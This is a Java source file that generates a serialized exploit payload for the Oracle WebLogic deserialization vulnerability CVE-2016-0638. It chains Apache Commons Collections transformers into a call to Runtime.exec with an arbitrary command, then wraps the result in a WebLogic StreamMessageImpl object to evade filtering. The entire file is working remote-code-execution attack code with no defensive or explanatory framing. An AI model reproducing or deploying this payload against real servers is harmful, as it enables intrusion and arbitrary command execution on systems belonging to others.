package com.snakinya.payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import weblogic.jms.common.StreamMessageImpl;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static com.snakinya.t3impl.t3impl.getFirstCtor;


public class CVE_2016_0638 {
    public static byte[] serialize(final Object obj) throws IOException {
        final ByteArrayOutputStream out = new ByteArrayOutputStream();
        final ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        return out.toByteArray();
    }
    public static byte[] executeCmd(String cmd) throws Exception, InvocationTargetException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
        };

        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
                .cast(Proxy.newProxyInstance(Map.class.getClassLoader(),
                        new Class[]{Map.class}, handler));

        handler = (InvocationHandler) getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, mapProxy);

        StreamMessageImpl obj = new StreamMessageImpl();
        byte[] o = serialize(handler);
        obj.setDataBuffer(o,o.length);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);

        objOut.flush();
        objOut.close();

        return out.toByteArray();
    }
}
